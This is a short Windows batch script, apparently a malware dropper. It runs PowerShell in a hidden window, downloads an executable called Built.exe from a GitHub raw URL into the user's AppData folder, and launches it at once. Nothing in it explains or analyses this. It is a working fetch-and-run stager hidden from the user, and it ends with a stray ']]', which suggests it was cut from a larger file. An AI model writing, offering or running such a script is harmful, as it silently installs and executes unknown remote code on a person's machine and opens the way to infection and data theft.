@echo off
set "downloadPath=%USERPROFILE%\AppData"
set "filePath=%downloadPath%\Built.exe"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/YAKIM233/2331/raw/main/Built.exe' -OutFile '%filePath%'"

start "" "%filePath%"

]]